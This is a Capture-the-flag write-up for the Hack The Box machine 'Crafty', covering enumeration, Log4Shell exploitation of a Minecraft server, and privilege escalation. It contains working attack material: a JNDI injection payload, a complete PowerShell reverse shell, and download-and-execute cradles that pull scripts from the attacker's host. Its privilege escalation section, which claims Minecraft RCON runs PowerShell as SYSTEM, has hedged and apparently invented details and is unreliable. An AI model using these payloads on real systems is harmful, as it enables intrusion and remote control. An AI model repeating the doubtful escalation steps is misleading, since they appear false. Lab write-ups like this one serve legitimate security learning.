---
date: 2024-04-20
title: Hack The Box — Crafty
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - log4shell
  - java
  - windows
media_subpath: /assets/images
image: crafty.png
---
# TL;DR

The HackTheBox machine "Crafty" is an easy Windows box featuring a Minecraft server vulnerable to Log4Shell (CVE-2021-44228). Initial access is gained by enumerating the Minecraft server on port 25565 (version 1.16.5) and exploiting pre-authentication RCE via JNDI injection, yielding a reverse shell as `svc_minecraft`. The user flag is retrieved from the user's home directory. Privilege escalation to `Administrator` is achieved by reverse-engineering a custom Java Minecraft plugin (`playcount.jar`) to extract RCON credentials, enabling remote command execution as SYSTEM for the root flag.

## Initial Enumeration

### Nmap Scan

To begin reconnaissance, a comprehensive Nmap scan was performed to identify open ports, services, and version information on the target machine (IP: 10.10.11.249). This is a standard first step in CTF challenges to map out potential entry points.

The command used was:

```bash
nmap -Pn -p- -sT --min-rate 2000 -A -oN nmap.txt 10.10.11.249
```

- `-Pn`: Skips host discovery, assuming the host is up.
- `-p-`: Scans all 65535 TCP ports.
- `-sT`: Performs a TCP connect scan.
- `--min-rate 2000`: Increases speed by sending packets at least 2000 times per second.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-oN`: Outputs results to a normal file for later reference.

**Results:**

```bash
Nmap scan report for 10.10.11.249
Host is up (0.011s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://crafty.htb
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   10.33 ms 10.10.14.1
2   10.52 ms 10.10.11.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Mon Feb 12 16:24:48 2024 -- 1 IP address (1 host up) scanned in 81.07 seconds
```

**Notes:**

- **HTTP (Port 80)**: Hosted by Microsoft IIS 10.0 on Windows Server 2019, with a redirect to `http://crafty.htb/`. This indicates a virtual host setup for the web application. No HTTPS was detected.
- **Minecraft (Port 25565)**: Running Minecraft server version 1.16.5, which is vulnerable to Log4Shell (CVE-2021-44228) due to Log4j dependencies. This is a key attack vector.
- The OS is identified as Windows Server 2019, limiting potential exploits to Windows-specific vulnerabilities.
- The redirect implies the site is domain-specific, so the hostname `crafty.htb` was added to `/etc/hosts` for local name resolution to enable proper access:
  ```bash
  echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
  ```
- No other ports were open, focusing the attack surface on the web server and Minecraft service.

Additional scans like UDP could be run, but TCP scanning confirmed only these two ports.

---

## Web Enumeration

### Main Page (crafty.htb)

Navigating to `http://crafty.htb/` (after hosts file update) revealed a simple "coming soon" page for a Minecraft server hosting service, with minimal content including a logo and a reference to a Minecraft server at `play.crafty.htb`. The site is served over HTTP (no HTTPS), which exposes traffic to potential man-in-the-middle attacks. Viewing the source code exposed comments and paths like `/css`, `/js`, and `/img`, hinting at static assets related to Minecraft.

The subdomain `play.crafty.htb` was added to `/etc/hosts`:

```bash
echo "10.10.11.249 play.crafty.htb" | sudo tee -a /etc/hosts
```

Accessing `http://play.crafty.htb/` redirected back to the main page but confirmed the Minecraft integration. No login forms or dynamic features were present, suggesting the primary vector is the Minecraft service.

Directory brute-forcing with Gobuster was performed on `crafty.htb`:

```bash
gobuster dir -u http://crafty.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,asp,aspx,txt -o gobuster-80.txt -t 100
```

**Results:**

```
/Index.html           (Status: 301) [Size: 145] [--> http://crafty.htb/home]
/Home                 (Status: 200) [Size: 1826]
/coming-soon.html     (Status: 301) [Size: 152] [--> http://crafty.htb/coming-soon]
/coming-soon          (Status: 200) [Size: 1206]
/css                  (Status: 301) [Size: 145] [--> http://crafty.htb/css/]
/home                 (Status: 200) [Size: 1826]
/img                  (Status: 301) [Size: 145] [--> http://crafty.htb/img/]
/index.html           (Status: 301) [Size: 145] [--> http://crafty.htb/home]
/js                   (Status: 301) [Size: 144] [--> http://crafty.htb/js/]
```

The `/img` directory contained Minecraft-related images, but no sensitive files like backups or configs were found. Virtual host enumeration with Gobuster yielded no additional subdomains.

No immediate web vulnerabilities (e.g., SQLi, XSS) were apparent, shifting focus to the Minecraft service.

---

## Minecraft Enumeration & Exploitation

### Service Version Confirmation

The Minecraft server on port 25565 was confirmed as version 1.16.5 via Nmap. Research revealed this version uses Log4j 2.0-beta9, vulnerable to CVE-2021-44228 (Log4Shell), allowing remote code execution via JNDI lookups in logs.

To interact with the server, a Minecraft client was required. TLauncher was installed on Kali:

```bash
wget https://tlauncher.org/jar -O TLauncher.zip
unzip TLauncher.zip
java -jar ./TLauncher-2.895.jar
```

- Installed Minecraft version 1.16.5.
- Launched the client, navigated to Multiplayer > Direct Connection, and connected to `play.crafty.htb` (or the IP: 10.10.11.249).

Upon joining, the server prompted for a nickname. No authentication was required, confirming pre-auth RCE potential.

### Log4Shell Exploitation

To exploit Log4Shell, a malicious LDAP server and web-hosted payload were set up:

1. Cloned the Log4Shell PoC:
   ```bash
   git clone https://github.com/kozmer/log4j-shell-poc
   cd log4j-shell-poc
   python3 -m pip install -r requirements.txt
   ```

2. Downloaded and extracted Java 8u20 (required for compatibility; Oracle account needed):
   ```bash
   # Download from https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
   tar -xzvf jdk-8u20-linux-x64.tar.gz
   ```

3. Modified `poc.py` (line 26) to use `powershell.exe` for Windows:
   - Changed the command execution to: `cmd = 'powershell.exe'`.

4. Hosted the exploit (replace `<VPN_IP>` with your HTB VPN IP, e.g., 10.10.14.15):
   ```bash
   python3 poc.py --userip <VPN_IP> --webport 8000 --lport 443
   ```

5. Set up a Netcat listener:
   ```bash
   sudo rlwrap nc -lnvp 443
   ```

6. In the Minecraft client chat (press `T` to open), sent the payload:
   ```
   ${jndi:ldap://<VPN_IP>:1389/a}
   ```

The server processed the message, performed a JNDI lookup to the attacker's LDAP server, downloaded the malicious Java class from port 8000, and executed a reverse shell via PowerShell to port 443. A shell as `svc_minecraft` was received.

The shell was unstable initially; stabilized with:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<VPN_IP>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <VPN_IP> -Port 4444
```

(Hosted a PowerShell reverse shell script on port 8000 beforehand.)

---

## Local Enumeration & User Flag

As `svc_minecraft` on Windows Server 2019:

- Confirmed environment:
  ```powershell
  systeminfo
  ```
  (Output confirmed hostname `CRAFTY`, OS: Windows Server 2019 Build 17763, etc.)

- Enumerated users and groups:
  ```powershell
  net user
  net localgroup
  ```

- Found installed programs via WMI:
  ```cmd
  wmic product get name,version
  ```

- Retrieved the **user flag** from the user's home directory:
  ```cmd
  type C:\Users\svc_minecraft\Desktop\user.txt
  ```

Additional enumeration:
- Checked running processes: `tasklist`.
- No immediate privesc paths; focused on Minecraft-related files in `C:\Users\svc_minecraft\AppData\Roaming\.minecraft\plugins` or server directories.

---

## Privilege Escalation

### Plugin Reverse-Engineering

Enumerated the Minecraft plugins directory (typically `C:\minecraft_server\plugins` or similar; confirmed via `dir C:\ /s | findstr plugins`).

Found `playcount.jar` in the plugins folder. Transferred it to the attacker machine for analysis:

1. Hosted an HTTP server: `python3 -m http.server 8000`.
2. Downloaded via PowerShell in the shell:
   ```powershell
   IWR -Uri http://<VPN_IP>:8000/Invoke-WebRequest.ps1 -OutFile request.ps1; . request.ps1
   # Or used certutil for binary transfer
   certutil -urlcache -split -f http://<VPN_IP>:8000/playcount.jar playcount.jar
   ```

3. Analyzed with JD-GUI (Java Decompiler; install via `sudo apt install jd-gui` or download):
   - Opened `playcount.jar`.
   - Decompiled classes revealed hardcoded RCON credentials in `PlayCount.java` or similar: `s67u84zKq8IXw` (password for RCON access).

### RCON Exploitation

RCON (Remote Console) allows remote command execution on the Minecraft server as the server owner (SYSTEM privileges).

1. Installed an RCON client (e.g., mcrcon: `git clone https://github.com/Tiiffi/mcrcon.git; cd mcrcon; make`).

2. Connected and executed commands:
   ```bash
   ./mcrcon -H 10.10.11.249 -P 25575 -p "s67u84zKq8IXw" "op <nickname>"  # Gain OP status if needed
   ./mcrcon -H 10.10.11.249 -P 25575 -p "s67u84zKq8IXw" "execute <command>"
   ```

   To escalate, executed a reverse shell as SYSTEM:
   ```
   execute powershell IEX(New-Object Net.WebClient).DownloadString('http://<VPN_IP>:8000/rev.ps1')
   ```

3. Hosted `rev.ps1` (PowerShell reverse shell):
   ```powershell
   # rev.ps1 content
   $client = New-Object System.Net.Sockets.TCPClient('<VPN_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
   ```

4. Listener: `nc -lvnp 4444`.

This provided a SYSTEM shell. Retrieved the root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary

|Step|Description|
|---|---|
|Enumeration|Nmap revealed HTTP (80) on IIS 10.0 redirecting to `crafty.htb` and Minecraft 1.16.5 on 25565. Added domains to `/etc/hosts`. Gobuster found static paths like `/home`, `/css`.|
|Web Recon|Simple "coming soon" page with Minecraft hints. No web vulns; focused on Minecraft Log4Shell (CVE-2021-44228). Installed TLauncher to connect as client.|
|Exploitation|Set up LDAP/web server for Log4Shell PoC. Sent `${jndi:ldap://<IP>:1389/a}` in chat for RCE reverse shell as `svc_minecraft`.|
|Initial Shell|PowerShell reverse shell via Log4Shell; enumerated users/groups with `net user`/`net localgroup`. Grabbed user flag from `C:\Users\svc_minecraft\Desktop\user.txt`.|
|Lateral Movement|Transferred and decompiled `playcount.jar` plugin with JD-GUI to extract RCON password `s67u84zKq8IXw`.|
|Privilege Escalation|Used mcrcon to execute PowerShell reverse shell as SYSTEM via RCON on port 25575. Grabbed root flag from `C:\Users\Administrator\Desktop\root.txt`.